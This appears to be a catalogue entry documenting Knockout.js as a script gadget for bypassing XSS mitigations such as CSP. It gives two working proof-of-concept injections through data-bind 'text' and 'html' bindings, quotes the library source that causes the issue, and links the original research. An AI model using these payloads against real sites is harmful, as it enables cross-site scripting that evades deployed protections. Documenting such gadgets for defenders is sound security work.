---
description: Knockout is a JavaScript [MVVM](https://en.wikipedia.org/wiki/Model%E2%80%93view%E2%80%93viewmodel) (a modern variant of MVC) library that makes it easier to create rich, desktop-like user interfaces with JavaScript and HTML. It uses observers to make your UI automatically stay in sync with an underlying data model, along with a powerful and extensible set of declarative bindings to enable productive development.
github: knockout/knockout
gadgets:
  Latest:
    authors:
      - twitter:slekies
      - twitter:kkotowicz
      - twitter:sirdarckcat
    tags:
      - chrome-browser
      - firefox-browser
      - safari-browser
      - any-tag
      - data-attr
      - unsafe-eval-csp
      - before-func-call
    pocs:
      - description: A `ko.applyBindings` call is required. This example requires the `unsafe-eval` CSP directive.
        code: |
          <!-- user input -->
          <x data-bind="text: alert(document.domain)"></x>

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.1/knockout-latest.js"></script>
          <script nonce="secret">
              ko.applyBindings();
          </script>
      - description: It is also possible to insert HTML using the [html binding](https://knockoutjs.com/documentation/html-binding.html) (this one won't work without an `unsafe-inline` CSP directive).<br><br>*The full list of default available binding can be find [here](https://github.com/knockout/knockout/tree/master/src/binding/defaultBindings).*
        code: |
          <!-- user input -->
          <div data-bind="html:'<iframe srcdoc=&quot;<script>alert(1)</script>&quot;></iframe>'"></div>

          <script nonce="secret" src="https://cdnjs.cloudflare.com/ajax/libs/knockout/3.5.1/knockout-latest.js"></script>
          <script nonce="secret">
              ko.applyBindings();
          </script>
    more-info: |
      **Root cause:**
      
      Source: <a target="_blank" href="https://github.com/knockout/knockout/blob/45e86bf0347cf742ca359bab051ea82fdfae7a5d/src/binding/bindingProvider.js#L2">https://github.com/knockout/knockout/blob/45e86bf0347cf742ca359bab051ea82fdfae7a5d/src/binding/bindingProvider.js#L2</a>

      ```javascript
      var defaultBindingAttributeName = "data-bind";
      ```

      Source: <a target="_blank" href="https://github.com/knockout/knockout/blob/master/src/binding/defaultBindings/text.js">https://github.com/knockout/knockout/blob/master/src/binding/defaultBindings/text.js</a>

      ```javascript
      ko.bindingHandlers['text'] = {
          'init': function() {
              // Prevent binding on the dynamically-injected text node (as developers are unlikely to expect that, and it has security implications).
              // It should also make things faster, as we no longer have to consider whether the text node might be bindable.
              return { 'controlsDescendantBindings': true };
          },
          'update': function (element, valueAccessor) {
              ko.utils.setTextContent(element, valueAccessor());
          }
      };
      ko.virtualElements.allowedBindings['text'] = true;
      ```

      Source: <a target="_blank" href="https://github.com/knockout/knockout/blob/master/src/binding/defaultBindings/html.js">https://github.com/knockout/knockout/blob/master/src/binding/defaultBindings/html.js</a>

      ```javascript
      ko.bindingHandlers['html'] = {
          'init': function() {
              // Prevent binding on the dynamically-injected HTML (as developers are unlikely to expect that, and it has security implications)
              return { 'controlsDescendantBindings': true };
          },
          'update': function (element, valueAccessor) {
              // setHtml will unwrap the value if needed
              ko.utils.setHtml(element, valueAccessor());
          }
      };
      ```
    links:
      - http://sebastian-lekies.de/slides/appsec2017.pdf
      - https://acmccs.github.io/papers/p1709-lekiesA.pdf
      - https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/knockout.php
      - https://github.com/google/security-research-pocs/blob/master/script-gadgets/repo/csp/sd/knockout_exploit.php
---
